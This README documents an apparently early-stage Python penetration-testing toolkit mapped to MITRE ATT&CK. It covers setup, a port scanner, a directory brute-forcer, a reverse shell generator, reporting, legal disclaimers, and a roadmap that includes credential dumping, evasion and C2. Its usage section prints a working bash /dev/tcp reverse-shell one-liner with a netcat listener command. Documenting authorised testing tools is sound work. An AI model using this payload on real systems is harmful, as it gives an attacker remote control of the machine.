# Offensive Security Toolkit

A comprehensive, modular Python framework for authorized security testing and research, aligned with the MITRE ATT&CK framework.

**Version**: 0.1.0 | **Status**: Active Development | **Python**: 3.8+

## [!] SECURITY POLICY

**CRITICAL:** This toolkit is for **DEFENSIVE SECURITY RESEARCH ONLY**

### Prohibited Activities
- [X] Malicious use or unauthorized access
- [X] Credential harvesting or bulk scanning without authorization
- [X] Attacks against systems you don't own or have permission to test
- [X] Any use for criminal purposes
- [X] Bypassing authentication on production systems without authorization

### Permitted Activities
- [v] Security research and learning in controlled environments
- [v] Vulnerability assessment on explicitly authorized systems
- [v] Penetration testing with written permission
- [v] Red team exercises with proper authorization and scope
- [v] Developing defensive countermeasures and detection rules
- [v] Security tool development and testing

**By using this toolkit, you agree to comply with all applicable laws and ethical guidelines.**

---

## Quick Start

### Installation

**Linux/Mac:**
```bash
git clone https://github.com/yourusername/offensive-toolkit.git
cd offensive-toolkit
chmod +x setup.sh
./setup.sh
source venv/bin/activate
```

**Windows:**
```powershell
git clone https://github.com/yourusername/offensive-toolkit.git
cd offensive-toolkit
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
.\setup.ps1
.\venv\Scripts\Activate.ps1
```

### Configuration

1. Edit `config/config.yaml` to customize settings:
```yaml
rate_limit:
  requests_per_second: 10
authorization:
  require_confirmation: true
```

2. Add authorized targets to `config/authorized_targets.txt`:
```
# Add one target per line
192.168.1.0/24
testlab.example.com
```

3. Review and understand [SECURITY.md](SECURITY.md) before proceeding

---

## Repository Structure

```
offensive-toolkit/
│
├── reconnaissance/         # OSINT and information gathering [MITRE: TA0043]
│   ├── port_scanner.py     # Network service discovery [T1046]
│   └── __init__.py
│
├── scanning/              # Network and vulnerability scanning [MITRE: TA0042]
│   └── __init__.py
│
├── exploitation/          # Exploit development and testing [MITRE: TA0002]
│   ├── reverse_shell.py   # Reverse shell generator [T1059]
│   └── __init__.py
│
├── post-exploitation/     # Post-access tools [MITRE: Multiple]
│   └── __init__.py
│
├── social-engineering/    # Phishing and social engineering [MITRE: TA0001]
│   └── __init__.py
│
├── wireless/             # Wireless security testing
│   └── __init__.py
│
├── web-security/         # Web application security [MITRE: TA0002]
│   ├── directory_bruteforcer.py  # Web path discovery [T1190]
│   └── __init__.py
│
├── payload-development/  # Payload creation [MITRE: TA0005]
│   └── __init__.py
│
├── evasion/             # AV/EDR evasion techniques [MITRE: TA0005]
│   └── __init__.py
│
├── reporting/           # Report generation
│   ├── report_generator.py  # HTML report generation
│   └── __init__.py
│
├── utils/               # Common utilities
│   ├── logger.py        # Centralized logging
│   ├── config.py        # Configuration management
│   ├── helpers.py       # Helper functions
│   └── __init__.py
│
├── docs/                # Documentation
│   ├── ARCHITECTURE.md  # Architecture documentation
│   └── MITRE-MAPPING.md # MITRE ATT&CK mapping
│
├── config/              # Configuration files
│   └── config.yaml      # Main configuration
│
├── logs/                # Log files
├── output/              # Tool output
├── README.md            # This file
├── SECURITY.md          # Security policy
├── CONTRIBUTING.md      # Contribution guidelines
├── CHANGELOG.md         # Version history
├── requirements.txt     # Python dependencies
├── setup.sh             # Linux/Mac setup script
└── setup.ps1            # Windows setup script
```

---

## Tool Inventory

### Implemented Tools

| Tool | Module | MITRE Technique | Description | Status |
|------|--------|-----------------|-------------|--------|
| [port_scanner.py](reconnaissance/port_scanner.py) | reconnaissance | T1046 | Network service discovery | [+] Active |
| [directory_bruteforcer.py](web-security/directory_bruteforcer.py) | web-security | T1190 | Web path enumeration | [+] Active |
| [reverse_shell.py](exploitation/reverse_shell.py) | exploitation | T1059 | Reverse shell generator | [+] Active |
| [report_generator.py](reporting/report_generator.py) | reporting | N/A | HTML report generation | [+] Active |

### Planned Tools (v0.2.0+)

- **Reconnaissance**: OSINT gathering, domain enumeration, subdomain discovery, email harvesting
- **Scanning**: Vulnerability scanner, service enumeration, SSL/TLS testing
- **Exploitation**: Exploit database integration, privilege escalation, buffer overflow testing
- **Post-Exploitation**: Credential dumping, lateral movement, persistence mechanisms
- **Social Engineering**: Phishing campaign manager, pretexting templates
- **Web Security**: SQL injection tester, XSS scanner, authentication bypass
- **Wireless**: WiFi security testing, Bluetooth attacks
- **Evasion**: AV bypass, obfuscation, sandbox detection

---

## Usage Examples

### 1. Port Scanning

Scan common ports on an authorized target:

```bash
# Scan common ports (21, 22, 23, 25, 53, 80, 110, 143, 443, etc.)
python reconnaissance/port_scanner.py --target 192.168.1.10

# Scan specific port range
python reconnaissance/port_scanner.py --target 192.168.1.10 --ports 1-1000

# Scan with custom rate limit
python reconnaissance/port_scanner.py --target 192.168.1.10 --rate-limit 5

# Scan specific ports
python reconnaissance/port_scanner.py --target example.com --ports 80,443,8080
```

**Output:**
```
[+] 192.168.1.10:22 - SSH - OPEN
[+] 192.168.1.10:80 - HTTP - OPEN
[+] 192.168.1.10:443 - HTTPS - OPEN

[+] Scan Summary:
    Target: 192.168.1.10
    Ports Scanned: 16
    Open Ports: 3
```

### 2. Web Directory Brute-Forcing

Discover hidden web paths on an authorized web application:

```bash
# Basic directory brute-force
python web-security/directory_bruteforcer.py \
    --target https://testapp.example.com \
    --wordlist wordlists/common.txt

# With custom rate limiting
python web-security/directory_bruteforcer.py \
    --target https://testapp.example.com \
    --wordlist wordlists/directories.txt \
    --rate-limit 5
```

**Note**: You'll need to create or download wordlists separately.

### 3. Reverse Shell Generation

Generate reverse shell payloads for authorized testing:

```bash
# Bash reverse shell
python exploitation/reverse_shell.py --lhost 192.168.1.100 --lport 4444 --type bash

# Python reverse shell
python exploitation/reverse_shell.py --lhost 192.168.1.100 --lport 4444 --type python

# PowerShell reverse shell
python exploitation/reverse_shell.py --lhost 192.168.1.100 --lport 4444 --type powershell
```

**Output:**
```
[+] BASH Reverse Shell Payload:

bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

[*] Set up listener with: nc -lvnp 4444
```

### 4. Report Generation

Generate HTML reports from scan results:

```bash
# Generate report from port scan results
python reporting/report_generator.py \
    --input output/portscan_192.168.1.10_20251015_143022.json \
    --output reports/security_assessment_report.html
```

---

## Configuration

### Main Configuration File

Edit `config/config.yaml`:

```yaml
# Logging settings
logging:
  level: INFO                      # DEBUG, INFO, WARNING, ERROR, CRITICAL
  file: logs/toolkit.log
  format: "[%(asctime)s] [%(levelname)s] %(message)s"

# Rate limiting
rate_limit:
  enabled: true
  requests_per_second: 10          # Adjust for stealth vs. speed

# Timeouts
timeouts:
  connection: 10                   # Connection timeout (seconds)
  read: 30                         # Read timeout (seconds)

# Output settings
output:
  directory: output
  format: json                     # json, csv, xml

# Authorization
authorization:
  require_confirmation: true       # Prompt before scanning
  scope_file: config/authorized_targets.txt
```

### Authorized Targets File

Edit `config/authorized_targets.txt`:

```
# Authorized Testing Targets
# Add one target per line

# CIDR notation for networks
192.168.1.0/24
10.0.0.0/8

# Individual hosts
testlab.example.com
192.168.50.10

# Wildcard domains
*.testlab.example.com

# [!] CRITICAL: Only add systems you have written authorization to test
```

### Environment Variables

Override configuration with environment variables:

```bash
# Set rate limit
export OSTK_RATE_LIMIT__REQUESTS_PER_SECOND=5

# Set log level
export OSTK_LOGGING__LEVEL=DEBUG

# Disable authorization confirmation (use with caution)
export OSTK_AUTHORIZATION__REQUIRE_CONFIRMATION=false
```

---

## MITRE ATT&CK Alignment

This toolkit is aligned with the MITRE ATT&CK framework for standardized categorization of tools and techniques.

### Current Coverage

| MITRE Tactic | Coverage | Module |
|--------------|----------|--------|
| TA0043 Reconnaissance | 10% | reconnaissance/ |
| TA0042 Resource Development | 5% | scanning/, payload-development/ |
| TA0001 Initial Access | 5% | social-engineering/, web-security/ |
| TA0002 Execution | 10% | exploitation/ |
| TA0005 Defense Evasion | 0% | evasion/, payload-development/ |
| TA0007 Discovery | 10% | reconnaissance/, scanning/ |

**See [docs/MITRE-MAPPING.md](docs/MITRE-MAPPING.md) for complete technique mappings.**

---

## Prerequisites

### Required
- **Python**: 3.8 or higher
- **Operating System**: Linux (recommended), macOS, Windows 10/11
- **Permissions**: Appropriate access rights for security testing

### Recommended
- **Kali Linux** or **Parrot Security OS** for comprehensive testing environment
- **Metasploit Framework** for exploit integration (future)
- **Burp Suite** for web application testing (future integration)
- **Wireshark** for packet analysis
- **nmap** for advanced network scanning

---

## Usage Guidelines

### Authorization Process

1. **Obtain Written Permission**
   - Secure written authorization from system owner
   - Define explicit scope (IP ranges, domains, applications)
   - Set testing windows and limitations
   - Establish communication protocols

2. **Define Scope**
   - Add authorized targets to `config/authorized_targets.txt`
   - Document scope limitations (no social engineering, no DoS, etc.)
   - Identify out-of-scope systems

3. **Execute Testing**
   - Review tools and techniques to be used
   - Follow rate limiting to avoid service impact
   - Document all activities in logs
   - Report findings as they are discovered

4. **Report Findings**
   - Use `reporting/report_generator.py` for professional reports
   - Follow responsible disclosure practices
   - Allow reasonable time (90 days) for remediation
   - Do not publicly disclose before patches are available

5. **Post-Engagement**
   - Remove any persistence mechanisms or backdoors
   - Delete collected data securely
   - Provide final report with recommendations
   - Assist with remediation verification

### Best Practices

- **Rate Limiting**: Use appropriate rate limits to avoid detection and service impact
- **Logging**: Keep comprehensive logs for audit trails
- **Stealth**: Consider detection avoidance techniques in production environments
- **Cleanup**: Always clean up after testing (remove files, persistence, etc.)
- **Communication**: Maintain open communication with client/system owner
- **Documentation**: Document every action taken during testing

---

## Development Roadmap

### Version 0.2.0 (Q1 2026) - Reconnaissance & Web Security
- [ ] Complete reconnaissance module (5+ tools)
- [ ] OSINT collection framework
- [ ] Domain and subdomain enumeration
- [ ] Email harvesting tool
- [ ] SQL injection testing framework
- [ ] XSS scanner
- [ ] Integration tests and CI/CD pipeline

### Version 0.3.0 (Q2 2026) - Social Engineering & Exploitation
- [ ] Phishing campaign manager
- [ ] Social engineering templates
- [ ] Exploit database integration
- [ ] Privilege escalation tools
- [ ] DefectDojo integration for vulnerability management

### Version 0.4.0 (Q3 2026) - Post-Exploitation & Evasion
- [ ] Credential dumping tools
- [ ] Lateral movement testing
- [ ] Persistence mechanisms
- [ ] AV/EDR evasion techniques
- [ ] Cloud security testing (AWS, Azure, GCP)

### Version 1.0.0 (Q4 2026) - Full Release
- [ ] 50%+ MITRE ATT&CK coverage
- [ ] C2 framework
- [ ] Comprehensive documentation
- [ ] Full test suite (80%+ coverage)
- [ ] Docker deployment
- [ ] Public release

**See [CHANGELOG.md](CHANGELOG.md) for detailed version history.**

---

## Contributing

We welcome contributions from the security community!

### How to Contribute

1. Read [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines
2. Fork the repository
3. Create a feature branch (`git checkout -b feature/amazing-tool`)
4. Follow coding standards (PEP 8, type hints, docstrings)
5. Write tests for your code
6. Update documentation
7. Submit a pull request

### Contribution Areas

- **New Tools**: Implement tools from the planned roadmap
- **Bug Fixes**: Fix issues in existing tools
- **Documentation**: Improve guides and API docs
- **Testing**: Add unit and integration tests
- **MITRE Mapping**: Expand technique coverage
- **Performance**: Optimize existing tools

### Code of Conduct

By contributing, you agree to:
- Only develop tools for defensive security purposes
- Follow responsible disclosure practices
- Maintain high code quality standards
- Respect the ethical guidelines in [SECURITY.md](SECURITY.md)

---

## Documentation

### Core Documentation

- [README.md](README.md) - This file (overview and usage)
- [SECURITY.md](SECURITY.md) - Security policy and ethical guidelines
- [CONTRIBUTING.md](CONTRIBUTING.md) - Contribution guidelines
- [CHANGELOG.md](CHANGELOG.md) - Version history and changes
- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) - Architecture and design
- [docs/MITRE-MAPPING.md](docs/MITRE-MAPPING.md) - MITRE ATT&CK mappings

### Tool Documentation

Each module contains:
- `__init__.py` - Module overview and imports
- Tool-specific docstrings and inline comments
- Usage examples in tool `--help` output

### API Documentation

Generate API documentation:
```bash
pip install sphinx sphinx-rtd-theme
cd docs/
sphinx-apidoc -o . ..
make html
```

---

## Testing

### Running Tests

```bash
# Run all tests
pytest

# Run with coverage
pytest --cov=. --cov-report=html

# Run specific test file
pytest tests/test_port_scanner.py

# Run with verbose output
pytest -v
```

### Test Coverage Goals

- **Unit Tests**: 80% minimum coverage
- **Integration Tests**: Core workflows tested
- **Security Tests**: Authorization and validation checks

---

## Legal Disclaimer

**IMPORTANT: READ CAREFULLY BEFORE USING THIS SOFTWARE**

This repository and all tools contained within are provided for **educational and authorized security testing purposes ONLY**.

### Legal Compliance

- **Authorization Required**: You MUST have explicit written permission before testing any systems
- **Illegal Activities**: Unauthorized access to computer systems is illegal under:
  - Computer Fraud and Abuse Act (CFAA) - United States
  - Computer Misuse Act - United Kingdom
  - Cybercrime Convention - European Union
  - Local laws in your jurisdiction
- **No Warranty**: This software is provided "AS IS" without warranty of any kind
- **No Liability**: The authors assume NO liability for misuse, damages, or legal consequences
- **User Responsibility**: You are solely responsible for ensuring legal compliance

### Prohibited Uses

Use of this toolkit for any of the following is STRICTLY PROHIBITED:
- Unauthorized access to systems, networks, or data
- Criminal activities of any kind
- Harassment, stalking, or invasion of privacy
- Disruption of services (DoS/DDoS attacks)
- Data theft or destruction
- Any activity violating applicable laws

### Permitted Uses

This toolkit may be used for:
- Authorized penetration testing with written permission
- Security research in controlled laboratory environments
- Educational purposes (academic institutions, training)
- Red team exercises with proper authorization
- Vulnerability assessment on systems you own or have permission to test
- Development of defensive security tools and countermeasures

**BY USING THIS SOFTWARE, YOU AGREE TO THESE TERMS AND ACCEPT FULL RESPONSIBILITY FOR YOUR ACTIONS.**

---

## Resources

### Security Testing Standards

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Web application security testing
- [PTES Technical Guidelines](http://www.pentest-standard.org/) - Penetration testing methodology
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) - Security best practices
- [MITRE ATT&CK](https://attack.mitre.org/) - Adversary tactics and techniques

### Learning Resources

- [Hack The Box](https://www.hackthebox.com/) - Legal hacking practice
- [TryHackMe](https://tryhackme.com/) - Cybersecurity training platform
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free web security training
- [SANS Reading Room](https://www.sans.org/reading-room/) - Security whitepapers

### Books

- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "The Hacker Playbook 3" by Peter Kim
- "Red Team Field Manual" by Ben Clark
- "Penetration Testing: A Hands-On Introduction" by Georgia Weidman

---

## Support

### Getting Help

- **Issues**: Report bugs and request features on [GitHub Issues](https://github.com/yourusername/offensive-toolkit/issues)
- **Discussions**: Ask questions in [GitHub Discussions](https://github.com/yourusername/offensive-toolkit/discussions)
- **Security**: Report security vulnerabilities via [GitHub Security Advisories](https://github.com/yourusername/offensive-toolkit/security/advisories)

### Contact

For security concerns or private inquiries:
- Open a GitHub Security Advisory (preferred for vulnerabilities)
- Create a GitHub issue (for non-sensitive questions)

---

## License

This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.

**Note**: This license applies to the code only. Use of this code for illegal activities voids the license and the authors accept no responsibility for such use.

---

## Acknowledgments

- **MITRE Corporation** - For the ATT&CK framework
- **OWASP Foundation** - For web security testing guidelines
- **Security Research Community** - For inspiration and knowledge sharing
- **Contributors** - See [CHANGELOG.md](CHANGELOG.md) for contributor list

---

## Project Status

**Version**: 0.1.0 (Initial Release)
**Status**: Active Development
**Last Updated**: 2025-10-15

### Statistics

- **Modules**: 10 categories
- **Tools**: 4 implemented, 100+ planned
- **MITRE Coverage**: ~10% (120 techniques mapped)
- **Documentation**: 5 core docs, comprehensive tool docs
- **Tests**: In development

---

**Remember**: With great power comes great responsibility. Use these tools ethically, legally, and always with proper authorization.

**[!] For Defensive Security Research Only**
